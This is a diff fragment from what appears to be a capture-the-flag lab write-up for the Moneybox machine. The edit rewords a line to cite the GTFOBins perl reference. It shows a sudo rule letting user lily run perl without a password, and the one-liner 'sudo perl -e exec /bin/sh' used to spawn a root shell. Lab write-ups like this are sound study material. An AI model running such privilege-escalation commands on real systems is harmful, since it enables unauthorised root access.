@@ -123,7 +123,7 @@ User lily may run the following commands on lab-pg-debian10-moneybox-241-190:
     (ALL : ALL) NOPASSWD: /usr/bin/perl
 ```
 
-Gained a privileged shell using `perl` via GTFOBins:
+Used the GTFOBins reference for the sudo `perl` binary to craft the root shell command ([GTFOBins — perl](https://gtfobins.org/gtfobins/perl/#shell)):
 
 ```
 lily@lab-pg-debian10-moneybox-241-190:~$ sudo perl -e 'exec "/bin/sh"'
